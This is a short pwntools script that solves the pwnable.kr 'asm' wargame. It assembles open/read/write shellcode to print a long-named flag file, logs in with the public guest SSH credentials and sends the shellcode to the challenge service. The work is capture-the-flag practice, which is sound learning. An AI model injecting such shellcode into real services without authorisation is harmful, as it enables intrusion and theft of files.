from pwn import *

context(arch='amd64', os='linux',log_level='debug')

file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

payload = shellcraft.open(file_name,0) 
payload += shellcraft.read('rax', 'rsp', 100) 
payload += shellcraft.write(1, 'rsp', 100) 
payload += shellcraft.exit(0)
print(payload)

shellcode = asm(payload)


sh = ssh('asm', 'pwnable.kr', password='guest', port=2222)
p = sh.remote('0', 9026)

print(p.recvuntil(b'shellcode:'))
p.sendline(shellcode)
p.interactive()
print(p.recv())
